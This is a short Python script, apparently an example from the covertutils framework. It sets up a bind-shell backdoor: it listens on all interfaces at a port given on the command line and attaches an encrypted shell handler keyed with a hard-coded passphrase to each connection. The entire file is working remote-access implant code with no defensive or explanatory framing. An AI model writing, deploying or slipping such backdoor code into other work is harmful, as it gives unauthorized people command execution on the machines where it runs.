#!/usr/bin/env python
from covertutils.handlers.impl import StandardShellHandler
from covertutils.orchestration import SimpleOrchestrator

from hashlib import sha512
import sys
import socket
from time import sleep

passphrase = "Pa55phra531"
addr = "0.0.0.0", int(sys.argv[1])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	#
s.bind( addr )		# Handling Networking
s.listen(5)		# independently of covertutils

while True :		# Make it listen `hard`
	client, client_addr = s.accept()		# Blocking the main thread

	def recv () :		# Create wrappers for networking
		return client.recv( 50 )

	def send( raw ) :		# Create wrappers for networking
		return client.send( raw )

	orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True, cycling_algorithm = sha512 )
	handler = StandardShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
